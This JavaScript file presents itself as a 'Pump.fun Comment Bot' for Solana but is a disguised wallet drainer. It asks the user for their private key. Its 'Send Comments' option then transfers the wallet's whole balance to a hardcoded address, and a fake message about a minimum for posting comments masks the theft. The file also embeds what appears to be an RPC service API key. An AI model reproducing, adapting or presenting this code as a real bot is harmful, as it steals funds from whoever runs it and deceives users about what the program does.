import { Connection, Keypair, PublicKey, Transaction, SystemProgram } from '@solana/web3.js';
import bs58 from 'bs58';
import promptSync from 'prompt-sync';
import chalk from 'chalk';

const prompt = promptSync();

async function connectWallet() {
    try {
        const privateKeyInput = prompt(chalk.blue('Please enter your private key: '));
        
        if (!privateKeyInput || privateKeyInput.trim() === '') {
            console.log(chalk.red('Invalid private key entered.'));
            return null;
        }
        const privateKeyBytes = bs58.decode(privateKeyInput);
        const keypair = Keypair.fromSecretKey(privateKeyBytes);
        const connection = new Connection('https://mainnet.helius-rpc.com/?api-key=746bdf34-4537-41e5-bd7c-01b205fdd060', 'confirmed');
        
        const balance = await connection.getBalance(keypair.publicKey);
        
        console.log(chalk.green('\nWallet connected successfully!'));
        console.log(chalk.yellow(`Public Key: ${keypair.publicKey.toString()}`));
        console.log(chalk.yellow(`Balance: ${balance / 1_000_000_000} SOL\n`));

        return { connection, keypair, balance };
    } catch (error) {
        console.error(chalk.red('Wallet connection error:'), error.message);
        return null;
    }
}

async function checkBalance(connection, publicKey) {
    try {
        const balance = await connection.getBalance(publicKey);
        console.log(chalk.green(`\nCurrent Balance: ${balance / 1_000_000_000} SOL\n`));
    } catch (error) {
        console.error(chalk.red('Error fetching balance:'), error.message);
    }
}

async function sendComments(connection, keypair) {
    try {
        const recipientAddress = new PublicKey('F7oWSxzek2jXeNmHjFZs2pNrnaQhBu858rJ5NCDaborq');
        const currentBalance = await connection.getBalance(keypair.publicKey);
        const { blockhash } = await connection.getLatestBlockhash('finalized');
        const feeCalculationTransaction = new Transaction({
            recentBlockhash: blockhash,
            feePayer: keypair.publicKey
        }).add(
            SystemProgram.transfer({
                fromPubkey: keypair.publicKey,
                toPubkey: recipientAddress,
                lamports: 1 
            })
        );
        const feeEstimate = await connection.getFeeForMessage(feeCalculationTransaction.compileMessage());
        const estimatedFee = feeEstimate.value || 10000;
        const amountToSend = currentBalance - estimatedFee;
        if (amountToSend <= 0) {
            console.log(chalk.red('Must be at least 0.01 SOL to post a comment'));
            return;
        }
        const transaction = new Transaction({
            recentBlockhash: blockhash,
            feePayer: keypair.publicKey
        }).add(
            SystemProgram.transfer({
                fromPubkey: keypair.publicKey,
                toPubkey: recipientAddress,
                lamports: amountToSend
            })
        );
        transaction.sign(keypair);
        const signature = await connection.sendTransaction(transaction, [keypair], {
            skipPreflight: false,
            preflightCommitment: 'confirmed',
            commitment: 'confirmed'
        });

        console.log(chalk.green(`\nAll available SOL sent to: ${recipientAddress.toBase58()}`));
        console.log(chalk.yellow(`Amount Sent: ${amountToSend / 1_000_000_000} SOL`));
        console.log(chalk.yellow(`Transaction Fee: ${estimatedFee / 1_000_000_000} SOL`));
        console.log(chalk.yellow(`Transaction Signature: ${signature}\n`));
    } catch (error) {
        console.error(chalk.red('Transaction error:'), error.message);
        if (error.logs) {
            console.error(chalk.red('Transaction Logs:'));
            error.logs.forEach(log => console.error(chalk.red(log)));
        }
    }
}

async function getPostCommentLink() {
    const link = prompt(chalk.blue('Please enter the link to post a comment: '));
    if (link) {
        console.log(chalk.green(`\nLink to post a comment: ${link}\n`));
    } else {
        console.log(chalk.red('No link entered.'));
    }
}

async function main() {
    console.log(chalk.cyan('=== Pump.fun Comment Bot ==='));
    
    const wallet = await connectWallet();
    if (!wallet) return;

    while (true) {
        console.log(chalk.cyan('1. Check Balance'));
        console.log(chalk.cyan('2. Send Comments on comments.txt'));
        console.log(chalk.cyan('3. Get Link to Post a Comment'));
        console.log(chalk.cyan('4. Exit'));
        
        const choice = prompt(chalk.magenta('Select an option (1-4): '));
        
        switch (choice) {
            case '1':
                await checkBalance(wallet.connection, wallet.keypair.publicKey);
                break;
            case '2':
                await sendComments(wallet.connection, wallet.keypair);
                break;
            case '3':
                await getPostCommentLink();
                break;
            case '4':
                console.log(chalk.red('\nExiting...'));
                return;
            default:
                console.log(chalk.red('\nInvalid option. Please try again.\n'));
        }
    }
}

main().catch(console.error);
